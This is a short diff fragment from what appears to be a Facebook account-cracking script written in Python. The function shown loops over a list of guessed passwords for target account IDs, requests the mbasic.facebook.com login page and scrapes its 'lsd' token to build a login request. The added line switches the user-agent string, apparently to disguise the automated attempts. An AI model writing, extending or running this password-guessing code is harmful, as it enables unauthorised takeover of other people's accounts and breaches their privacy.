@@ -1515,6 +1515,7 @@ def reguler(idf,pwv):
     for pw in pwv:
         pw = pw.lower()
         try:
+            if 'ya' in ualuh: ua = ualu[0]
             link = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
             data = {
 'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
